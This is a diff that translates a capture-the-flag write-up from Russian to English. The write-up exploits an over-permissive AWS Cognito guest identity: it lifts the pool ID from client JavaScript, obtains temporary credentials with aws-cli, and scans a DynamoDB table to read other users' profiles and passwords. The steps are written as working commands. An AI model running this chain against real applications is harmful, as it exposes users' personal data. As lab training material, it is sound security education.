@@ -1,7 +1,6 @@
-**Теги:** Cloud, AWS, Cognito, IAM Misconfiguration.
-**Сложность:** Easy.
+**Tags:** Cloud, AWS, Cognito, IAM Misconfiguration.
 
-**Target:**
+**Difficulty:** Easy.
 
 ```text
 http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
@@ -9,13 +8,13 @@ http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.co
 
 ## 1. Reconnaissance
 
-Начинаем с определения открытых портов и запущенных сервисов с помощью Nmap:
+We begin by identifying open ports and running services using Nmap:
 
 ```bash
 sudo nmap -sS -sV complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com
 ```
 
-Получаем:
+Output:
 
 ```text
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-03 05:41 EDT
@@ -31,15 +30,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
 ```
 
-Из результатов видно, что веб-приложение размещено в AWS S3. Доступен HTTP на `80/tcp`, а сам hostname указывает на S3 Website Endpoint в регионе `us-east-1`.
+The results show that the web application is hosted on AWS S3. HTTP is available on `80/tcp`, and the hostname indicates an S3 Website Endpoint in the `us-east-1` region.
 
 ---
 
-## 2. Анализ JavaScript приложения
+## 2. Analyzing the JavaScript Application
 
-После просмотра исходного кода страницы обнаруживаем файл `app.js`.
+After inspecting the page source, we discover the `app.js` file.
 
-В JavaScript находятся параметры AWS:
+The JavaScript contains AWS configuration parameters:
 
 ```javascript
 const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
@@ -47,9 +46,9 @@ const AWS_REGION = "us-east-1";
 const TABLE_NAME = "complimentary-GuestWellnessProfiles";
 ```
 
-Это важная находка: приложение использует **Amazon Cognito Identity Pool** для получения AWS-учётных данных, а затем работает с таблицей DynamoDB `complimentary-GuestWellnessProfiles`.
+This is an important finding: the application uses an **Amazon Cognito Identity Pool** to obtain AWS credentials and then interacts with the DynamoDB table `complimentary-GuestWellnessProfiles`.
 
-Таким образом, из клиентского JavaScript были получены:
+The following information can therefore be obtained from the client-side JavaScript:
 
 * Cognito Identity Pool:
   `us-east-1:836c0949-292d-485b-b532-52d5ca7bb688`
@@ -60,15 +59,15 @@ const TABLE_NAME = "complimentary-GuestWellnessProfiles";
 
 ---
 
-## 3. Поиск дополнительных директорий
+## 3. Directory Enumeration
 
-Проверяем веб-сервер с помощью Gobuster:
+We check the web server using Gobuster:
 
 ```bash
 gobuster dir -u complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com -w ~/HH101/seclists/Discovery/Web-Content/big.txt -t2 --timeout 30s
 ```
 
-Конфигурация сканирования:
+Scan configuration:
 
 ```text
 ===============================================================
@@ -87,27 +86,27 @@ Starting gobuster in directory enumeration mode
 ===============================================================
 ```
 
-Во время сканирования происходят ошибки DNS/network timeout:
+During the scan, DNS/network timeouts occur:
 
 ```text
 Progress: 11400 / 20482 (55.66%)[ERROR] Get "http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/maquettes": dial tcp: lookup complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com on 10.0.2.3:53: read udp 10.0.2.15:59189->10.0.2.3:53: i/o timeout
 ```
 
-Также обнаруживается:
+We also discover:
 
 ```text
 /soap                 (Status: 200) [Size: 0
 ```
 
-Однако `/soap` не отвечает на запросы в браузере.
+However, `/soap` does not respond to requests in the browser.
 
-Таким образом, дальнейший интерес представляет не найденная директория, а обнаруженные ранее AWS-конфигурационные данные из `app.js`.
+Therefore, the more interesting finding is not the discovered directory, but the AWS configuration data previously found in `app.js`.
 
 ---
 
-# 4. Получение Cognito Identity через aws-cli
+# 4. Obtaining a Cognito Identity with aws-cli
 
-Имея `IDENTITY_POOL_ID`, обращаемся к Amazon Cognito и запрашиваем Identity ID:
+With the `IDENTITY_POOL_ID`, we contact Amazon Cognito and request an Identity ID:
 
 ```bash
 aws cognito-identity get-id \
@@ -115,7 +114,7 @@ aws cognito-identity get-id \
   --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
 ```
 
-Ответ:
+Response:
 
 ```json
 {
@@ -123,19 +122,19 @@ aws cognito-identity get-id \
 }
 ```
 
-На этом этапе Cognito выдаёт идентификатор временной identity:
+At this stage, Cognito provides an identifier for a temporary identity:
 
 ```text
 us-east-1:4d571309-b08d-c56a-c543-30e257953228
 ```
 
-То есть приложение использует Cognito Identity Pool, через который анонимный/гостевой пользователь потенциально может получить временные AWS credentials.
+The application therefore uses a Cognito Identity Pool through which an anonymous/guest user can potentially obtain temporary AWS credentials.
 
 ---
 
-# 5. Получение временных AWS credentials
+# 5. Obtaining Temporary AWS Credentials
 
-Следующим шагом запрашиваем временные credentials для Cognito Identity:
+Next, we request temporary credentials for the Cognito Identity:
 
 ```bash
 aws cognito-identity get-credentials-for-identity \
@@ -143,7 +142,7 @@ aws cognito-identity get-credentials-for-identity \
   --identity-id "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
 ```
 
-AWS возвращает:
+AWS returns:
 
 ```json
 {
@@ -157,11 +156,11 @@ AWS возвращает:
 }
 ```
 
-В полном выводе AWS также присутствовал большой `SessionToken`.
+The full AWS output also contained a large `SessionToken`.
 
-Полученные credentials являются **временными AWS credentials**, которые позволяют выполнять действия в AWS от имени той Cognito Identity, которой они были выданы.
+The obtained credentials are **temporary AWS credentials** that allow AWS actions to be performed on behalf of the Cognito Identity to which they were issued.
 
-Время действия credentials ограничено:
+Their validity is limited:
 
 ```text
 Expiration: 2026-08-03T07:51:01-04:00
@@ -169,9 +168,9 @@ Expiration: 2026-08-03T07:51:01-04:00
 
 ---
 
-# 6. Экспорт AWS credentials
+# 6. Exporting AWS Credentials
 
-Чтобы AWS CLI автоматически использовал полученные временные credentials, мы экспортируем их в переменные окружения:
+To make the AWS CLI automatically use the obtained temporary credentials, we export them as environment variables:
 
 ```bash
 export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYKP67ULN3"
@@ -180,9 +179,9 @@ export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjELv..."
 export AWS_DEFAULT_REGION="us-east-1"
 ```
 
-После этого AWS CLI будет использовать эти значения для последующих запросов.
+After this, the AWS CLI uses these values for subsequent requests.
 
-Также устанавливается регион по умолчанию:
+We also set the default AWS region:
 
 ```text
 AWS_DEFAULT_REGION=us-east-1
@@ -190,43 +189,43 @@ AWS_DEFAULT_REGION=us-east-1
 
 ---
 
-# 7. Проверка AWS Identity
+# 7. Checking the AWS Identity
 
-После установки credentials проверяем, от имени какой AWS identity выполняются запросы:
+After setting the credentials, we check which AWS identity is being used:
 
 ```bash
 aws sts get-caller-identity
 ```
 
-Команда используется для проверки текущего AWS-контекста и подтверждения того, что временные credentials действительно работают.
+This command is used to verify the current AWS context and confirm that the temporary credentials are working.
 
-В логе непосредственно вывод этой команды отсутствует.
+The output of this command is not included in the log.
 
 ---
 
-# 8. Доступ к DynamoDB
+# 8. Accessing DynamoDB
 
-Ранее в `app.js` мы обнаружили название таблицы:
+Earlier, we discovered the table name in `app.js`:
 
 ```text
 complimentary-GuestWellnessProfiles
 ```
 
-Теперь используем полученные AWS credentials для обращения к DynamoDB:
+We can now use the obtained AWS credentials to access DynamoDB:
 
 ```bash
 aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
 ```
 
-Запрос `scan` позволяет получить записи из таблицы DynamoDB.
+The `scan` request retrieves records from the DynamoDB table.
 
-В результате обнаруживаются профили пользователей.
+As a result, user profiles are discovered.
 
 ---
 
-# 9. Первый профиль
+# 9. First Profile
 
-В таблице находится профиль:
+The table contains the following profile:
 
 ```text
 password: digitaldetox2026
@@ -238,13 +237,13 @@ phone: +1-555-0193
 name: Vibe (Move Fast & Break Things)
 ```
 
-Таким образом, гостевая AWS identity получила возможность читать данные из таблицы с профилями пользователей.
+The guest AWS identity therefore has the ability to read data from the user profile table.
 
 ---
 
-# 10. Второй профиль
+# 10. Second Profile
 
-Следующая запись содержит:
+The next record contains:
 
 ```text
 password: sunkissed88
@@ -256,13 +255,13 @@ phone: +1-555-0142
 name: Lambo (@0xMia)
 ```
 
-Это подтверждает, что доступ распространяется не только на собственный профиль гостя, но и на другие записи таблицы.
+This confirms that access is not limited to the guest's own profile and extends to other records in the table.
 
 ---
 
-# 11. Поиск флага
+# 11. Finding the Flag
 
-В следующей записи находится наиболее важная информация:
+The next record contains the most important information:
 
 ```text
 password: escalation_only
@@ -274,31 +273,30 @@ phone: +1-555-0100
 name: Guest VIP-042
 ```
 
-В поле `notes` непосредственно указано, что роль гостя в wellness-приложении может читать **все профили**, а не только собственный.
+The `notes` field explicitly states that the wellness application's guest role can read **all profiles**, rather than only its own.
 
-Здесь же находится флаг:
-
-```text
-THM{fr33_app_fr33_d4t4!}
-```
-
-
-## Что произошло
-
-Цепочка атаки выглядит следующим образом:
-
-1. Nmap показал, что приложение размещено на AWS S3.
-2. В `app.js` были найдены `IDENTITY_POOL_ID`, регион AWS и название DynamoDB-таблицы.
-3. Через `aws cognito-identity get-id` был получен Cognito Identity ID.
-4. Через `get-credentials-for-identity` были получены временные AWS credentials.
-5. Credentials были установлены в переменные окружения.
-6. `aws sts get-caller-identity` использовался для проверки текущей AWS identity.
-7. Полученные права позволили выполнить `DynamoDB Scan`.
-8. `Scan` вернул содержимое таблицы `complimentary-GuestWellnessProfiles`, включая чужие профили.
-9. В поле `notes` одного из профилей был найден флаг:
+The flag is also found in the same field:
 
 ```text
 THM{fr33_app_fr33_d4t4!}
 ```
 
-Основная проблема комнаты — **избыточные права гостевой Cognito identity**, позволившие читать все профили DynamoDB вместо ограничения доступа данными конкретного пользователя.
+## What Happened
+
+The attack chain can be summarized as follows:
+
+1. Nmap showed that the application was hosted on AWS S3.
+2. The `app.js` file exposed the `IDENTITY_POOL_ID`, AWS region, and DynamoDB table name.
+3. `aws cognito-identity get-id` was used to obtain a Cognito Identity ID.
+4. `get-credentials-for-identity` was used to obtain temporary AWS credentials.
+5. The credentials were exported as environment variables.
+6. `aws sts get-caller-identity` was used to verify the current AWS identity.
+7. The obtained permissions allowed a DynamoDB `Scan`.
+8. The `Scan` returned the contents of the `complimentary-GuestWellnessProfiles` table, including other users' profiles.
+9. The flag was found in the `notes` field of one of the profiles:
+
+```text
+THM{fr33_app_fr33_d4t4!}
+```
+
+The main issue in the room is **excessive permissions assigned to the guest Cognito identity**, allowing it to read all DynamoDB profiles instead of restricting access to the data belonging to the individual user.
